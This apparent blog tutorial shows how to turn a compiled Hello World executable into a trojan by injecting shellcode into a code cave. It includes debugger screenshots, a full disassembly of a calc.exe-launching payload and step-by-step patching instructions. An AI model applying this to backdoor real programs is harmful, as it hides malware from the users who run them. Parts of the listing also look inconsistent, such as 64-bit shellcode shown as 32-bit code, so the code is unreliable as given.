---
title: "Trojan Horse"
date: 2021-04-15T23:39:49+05:30
tags: ["Malware"]
type: "post"
image: "/images/lorem-ipsum/quick-fox.png"
showTableOfContents: false
---
# Understanding the working of Trojans

### What is a Trojan?

- A Trojan is a type of malicious software that masquerades as legitimate software but carries out harmful actions on a computer or device. It tricks users into installing it, enabling theft of data, unauthorised access, and other security breaches.
- Trojans can be spread through various means, such as email attachments, software downloads, and even through websites. Once installed, they can remain undetected while stealing sensitive information such as passwords, credit card numbers, and banking information. Users should always be cautious when downloading and installing software from unknown sources and keep their antivirus software up to date to prevent Trojan infections.

### Now let’s understand what are code caves……

Code caves, also referred to as "code padding" or "code splicing," represent areas of untouched memory space within a computer program. These regions remain deliberately empty by the program's developers, providing a unique opportunity for hackers and expert developers to introduce their own code without drawing undue attention.

### How can code caves be used for our Trojan purpose ????

To utilise a code cave, we need to meticulously analyse the binary code of the target program or employs debugging tools to locate sections of unused memory space. Once the empty areas are identified, the hacker carefully injects custom-made code, being cautious not to disrupt critical program instructions. This ingenious technique allows the malware to remain hidden in plain sight, making it significantly more challenging for security experts to identify and neutralise the threat.

### Enough of theory Now let’s start going inside the intricacies of building a simple trojan

**Simple Program**

```cpp
#include<iostream>

using namespace std;

int main(){
	cout<<"Hello World\n"<<endl;
	return 0;
}

//compile the above in visual studio
```

**HexEdit View**

![General Hex View of PE File](https://hackmd.io/_uploads/HyO1cjLXa.png)

**Code Cave**
![Code Cave](https://hackmd.io/_uploads/HkdJcjLmp.png)

Time to Dive into ***x64dbg*** to dig deeper  

```nasm
entrypoint

00C01140 | E9 97630000              | jmp <pe-deepdive._mainCRTStartup>       |
00C01145 | E9 2DE20100              | jmp <pe-deepdive.private: static bool _ |
00C0114A | E9 FE810000              | jmp <pe-deepdive.___except_validate_jum |
00C0114F | E9 5C1A0500              | jmp <pe-deepdive.bool __cdecl __crt_str |
00C01154 | E9 16F00100              | jmp <pe-deepdive.struct `private: bool  |
00C01159 | E9 E5E20400              | jmp <pe-deepdive.__msize_base>          |
00C0115E | E9 27710000              | jmp <pe-deepdive.___report_gsfailure>   |
00C01163 | E9 65090100              | jmp <pe-deepdive.private: static class  |
00C01168 | E9 4B8D0400              | jmp <pe-deepdive.public: void __thiscal |
00C0116D | E9 23800400              | jmp <pe-deepdive.___fpecode>            |
00C01172 | E9 2D950100              | jmp <pe-deepdive.protected: __thiscall  |
........  
```

```nasm
Code-cave

00C65090 | 0000                     | add byte ptr ds:[eax],al                              |
```

![Untitled 2.png](https://hackmd.io/_uploads/rJu1qjL7p.png)

- We copy our payload and put the same in the code cave.

```nasm
**Modified - Disassembly**
00B27B81 | 60                       | pushad                                  |
00B27B82 | 9C                       | pushfd                                  |
00B27B83 | FC                       | cld                                     |
00B27B84 | 48                       | dec eax                                 | eax:",øï"
00B27B85 | 83E4 F0                  | and esp,FFFFFFF0                        |
00B27B88 | E8 C0000000              | call pe-deepdive.B27C4D                 |
00B27B8D | 41                       | inc ecx                                 | ecx:"éú4"
00B27B8E | 51                       | push ecx                                | ecx:"éú4"
00B27B8F | 41                       | inc ecx                                 | ecx:"éú4"
00B27B90 | 50                       | push eax                                | eax:",øï"
00B27B91 | 52                       | push edx                                | edx:"éú4"
00B27B92 | 51                       | push ecx                                | ecx:"éú4"
00B27B93 | 56                       | push esi                                | esi:"éú4"
00B27B94 | 48                       | dec eax                                 | eax:",øï"
00B27B95 | 31D2                     | xor edx,edx                             | edx:"éú4"
00B27B97 | 65:48                    | dec eax                                 | eax:",øï"
00B27B99 | 8B52 60                  | mov edx,dword ptr ds:[edx+60]           | edx:"éú4"
00B27B9C | 48                       | dec eax                                 | eax:",øï"
00B27B9D | 8B52 18                  | mov edx,dword ptr ds:[edx+18]           | edx:"éú4"
00B27BA0 | 48                       | dec eax                                 | eax:",øï"
00B27BA1 | 8B52 20                  | mov edx,dword ptr ds:[edx+20]           | edx:"éú4"
00B27BA4 | 48                       | dec eax                                 | eax:",øï"
00B27BA5 | 8B72 50                  | mov esi,dword ptr ds:[edx+50]           | esi:"éú4", edx+50:"éÊè\x01"
00B27BA8 | 48                       | dec eax                                 | eax:",øï"
00B27BA9 | 0FB74A 4A                | movzx ecx,word ptr ds:[edx+4A]          | ecx:"éú4"
00B27BAD | 4D                       | dec ebp                                 |
00B27BAE | 31C9                     | xor ecx,ecx                             | ecx:"éú4"
00B27BB0 | 48                       | dec eax                                 | eax:",øï"
00B27BB1 | 31C0                     | xor eax,eax                             | eax:",øï"
00B27BB3 | AC                       | lodsb                                   |
00B27BB4 | 3C 61                    | cmp al,61                               | 61:'a'
00B27BB6 | 7C 02                    | jl pe-deepdive.B27BBA                   |
00B27BB8 | 2C 20                    | sub al,20                               |
00B27BBA | 41                       | inc ecx                                 | ecx:"éú4"
00B27BBB | C1C9 0D                  | ror ecx,D                               | ecx:"éú4"
00B27BBE | 41                       | inc ecx                                 | ecx:"éú4"
00B27BBF | 01C1                     | add ecx,eax                             | ecx:"éú4", eax:",øï"
00B27BC1 | E2 ED                    | loop pe-deepdive.B27BB0                 |
00B27BC3 | 52                       | push edx                                | edx:"éú4"
00B27BC4 | 41                       | inc ecx                                 | ecx:"éú4"
00B27BC5 | 51                       | push ecx                                | ecx:"éú4"
00B27BC6 | 48                       | dec eax                                 | eax:",øï"
00B27BC7 | 8B52 20                  | mov edx,dword ptr ds:[edx+20]           | edx:"éú4"
00B27BCA | 8B42 3C                  | mov eax,dword ptr ds:[edx+3C]           | eax:",øï", edx+3C:"é“¼\x04"
00B27BCD | 48                       | dec eax                                 | eax:",øï"
00B27BCE | 01D0                     | add eax,edx                             | eax:",øï", edx:"éú4"
00B27BD0 | 8B80 88000000            | mov eax,dword ptr ds:[eax+88]           | eax:",øï"
00B27BD6 | 48                       | dec eax                                 | eax:",øï"
00B27BD7 | 85C0                     | test eax,eax                            | eax:",øï"
00B27BD9 | 74 67                    | je pe-deepdive.B27C42                   |
00B27BDB | 48                       | dec eax                                 | eax:",øï"
00B27BDC | 01D0                     | add eax,edx                             | eax:",øï", edx:"éú4"
00B27BDE | 50                       | push eax                                | eax:",øï"
00B27BDF | 8B48 18                  | mov ecx,dword ptr ds:[eax+18]           | ecx:"éú4"
00B27BE2 | 44                       | inc esp                                 |
00B27BE3 | 8B40 20                  | mov eax,dword ptr ds:[eax+20]           | eax:",øï"
00B27BE6 | 49                       | dec ecx                                 | ecx:"éú4"
00B27BE7 | 01D0                     | add eax,edx                             | eax:",øï", edx:"éú4"
00B27BE9 | E3 56                    | jecxz pe-deepdive.B27C41                |
00B27BEB | 48                       | dec eax                                 | eax:",øï"
00B27BEC | FFC9                     | dec ecx                                 | ecx:"éú4"
00B27BEE | 41                       | inc ecx                                 | ecx:"éú4"
00B27BEF | 8B3488                   | mov esi,dword ptr ds:[eax+ecx*4]        | esi:"éú4"
00B27BF2 | 48                       | dec eax                                 | eax:",øï"
00B27BF3 | 01D6                     | add esi,edx                             | esi:"éú4", edx:"éú4"
00B27BF5 | 4D                       | dec ebp                                 |
00B27BF6 | 31C9                     | xor ecx,ecx                             | ecx:"éú4"
00B27BF8 | 48                       | dec eax                                 | eax:",øï"
00B27BF9 | 31C0                     | xor eax,eax                             | eax:",øï"
00B27BFB | AC                       | lodsb                                   |
00B27BFC | 41                       | inc ecx                                 | ecx:"éú4"
00B27BFD | C1C9 0D                  | ror ecx,D                               | ecx:"éú4"
00B27C00 | 41                       | inc ecx                                 | ecx:"éú4"
00B27C01 | 01C1                     | add ecx,eax                             | ecx:"éú4", eax:",øï"
00B27C03 | 38E0                     | cmp al,ah                               |
00B27C05 | 75 F1                    | jne pe-deepdive.B27BF8                  |
00B27C07 | 4C                       | dec esp                                 |
00B27C08 | 034C24 08                | add ecx,dword ptr ss:[esp+8]            |
00B27C0C | 45                       | inc ebp                                 |
00B27C0D | 39D1                     | cmp ecx,edx                             | ecx:"éú4", edx:"éú4"
00B27C0F | 75 D8                    | jne pe-deepdive.B27BE9                  |
00B27C11 | 58                       | pop eax                                 | eax:",øï"
00B27C12 | 44                       | inc esp                                 |
00B27C13 | 8B40 24                  | mov eax,dword ptr ds:[eax+24]           | eax:",øï"
00B27C16 | 49                       | dec ecx                                 | ecx:"éú4"
00B27C17 | 01D0                     | add eax,edx                             | eax:",øï", edx:"éú4"
00B27C19 | 66:41                    | inc cx                                  |
00B27C1B | 8B0C48                   | mov ecx,dword ptr ds:[eax+ecx*2]        | ecx:"éú4"
00B27C1E | 44                       | inc esp                                 |
00B27C1F | 8B40 1C                  | mov eax,dword ptr ds:[eax+1C]           | eax:",øï", eax+1C:"mŠæw"
00B27C22 | 49                       | dec ecx                                 | ecx:"éú4"
00B27C23 | 01D0                     | add eax,edx                             | eax:",øï", edx:"éú4"
00B27C25 | 41                       | inc ecx                                 | ecx:"éú4"
00B27C26 | 8B0488                   | mov eax,dword ptr ds:[eax+ecx*4]        | eax:",øï"
00B27C29 | 48                       | dec eax                                 | eax:",øï"
00B27C2A | 01D0                     | add eax,edx                             | eax:",øï", edx:"éú4"
00B27C2C | 41                       | inc ecx                                 | ecx:"éú4"
00B27C2D | 58                       | pop eax                                 | eax:",øï"
00B27C2E | 41                       | inc ecx                                 | ecx:"éú4"
00B27C2F | 58                       | pop eax                                 | eax:",øï"
00B27C30 | 5E                       | pop esi                                 | esi:"éú4"
00B27C31 | 59                       | pop ecx                                 | ecx:"éú4"
00B27C32 | 5A                       | pop edx                                 | edx:"éú4"
00B27C33 | 41                       | inc ecx                                 | ecx:"éú4"
00B27C34 | 58                       | pop eax                                 | eax:",øï"
00B27C35 | 41                       | inc ecx                                 | ecx:"éú4"
00B27C36 | 59                       | pop ecx                                 | ecx:"éú4"
00B27C37 | 41                       | inc ecx                                 | ecx:"éú4"
00B27C38 | 5A                       | pop edx                                 | edx:"éú4"
00B27C39 | 48                       | dec eax                                 | eax:",øï"
00B27C3A | 83EC 20                  | sub esp,20                              |
00B27C3D | 41                       | inc ecx                                 | ecx:"éú4"
00B27C3E | 52                       | push edx                                | edx:"éú4"
00B27C3F | FFE0                     | jmp eax                                 |
00B27C41 | 58                       | pop eax                                 | eax:",øï"
00B27C42 | 41                       | inc ecx                                 | ecx:"éú4"
00B27C43 | 59                       | pop ecx                                 | ecx:"éú4"
00B27C44 | 5A                       | pop edx                                 | edx:"éú4"
00B27C45 | 48                       | dec eax                                 | eax:",øï"
00B27C46 | 8B12                     | mov edx,dword ptr ds:[edx]              | edx:"éú4"
00B27C48 | E9 57FFFFFF              | jmp pe-deepdive.B27BA4                  |
00B27C4D | 5D                       | pop ebp                                 |
00B27C4E | 48                       | dec eax                                 | eax:",øï"
00B27C4F | BA 01000000              | mov edx,1                               | edx:"éú4"
00B27C54 | 0000                     | add byte ptr ds:[eax],al                | eax:",øï"
00B27C56 | 0000                     | add byte ptr ds:[eax],al                | eax:",øï"
00B27C58 | 48                       | dec eax                                 | eax:",øï"
00B27C59 | 8D8D 01010000            | lea ecx,dword ptr ss:[ebp+101]          |
00B27C5F | 41                       | inc ecx                                 | ecx:"éú4"
00B27C60 | BA 318B6F87              | mov edx,876F8B31                        | edx:"éú4"
00B27C65 | FFD5                     | call ebp                                |
00B27C67 | BB E01D2A0A              | mov ebx,A2A1DE0                         |
00B27C6C | 41                       | inc ecx                                 | ecx:"éú4"
00B27C6D | BA A695BD9D              | mov edx,9DBD95A6                        | edx:"éú4"
00B27C72 | FFD5                     | call ebp                                |
00B27C74 | 48                       | dec eax                                 | eax:",øï"
00B27C75 | 83C4 28                  | add esp,28                              |
00B27C78 | 3C 06                    | cmp al,6                                |
00B27C7A | 7C 0A                    | jl pe-deepdive.B27C86                   |
00B27C7C | 80FB E0                  | cmp bl,E0                               |
00B27C7F | 75 05                    | jne pe-deepdive.B27C86                  |
00B27C81 | BB 4713726F              | mov ebx,6F721347                        |
00B27C86 | 6A 00                    | push 0                                  |
00B27C88 | 59                       | pop ecx                                 | ecx:"éú4"
00B27C89 | 41                       | inc ecx                                 | ecx:"éú4"
00B27C8A | 89DA                     | mov edx,ebx                             | edx:"éú4"
00B27C8C | FFD5                     | call ebp                                |
00B27C8E | 6361 6C                  | arpl word ptr ds:[ecx+6C],sp            |
00B27C91 | 632E                     | arpl word ptr ds:[esi],bp               |
00B27C93 | 65:78 65                 | js pe-deepdive.B27CFB                   |
00B27C96 | 0000                     | add byte ptr ds:[eax],al                | eax:",øï
```

### Detailed Walkthrough

1. We first open our compiled executable in x32dbg and find its entry point, and make a note of it.
2. We then find the code cave and put its address in our entry point.
3. We come to the code cave and use 2 operations - pushad & pushfd.
4. After that, we insert our payload into the code cave area.
5. We put the following commands - popad & popfd.
6. After that we keep our original code-startup address and the one following it.
7. Applying the patches makes our small trojan POC work successfully.
8. Tested in windows 10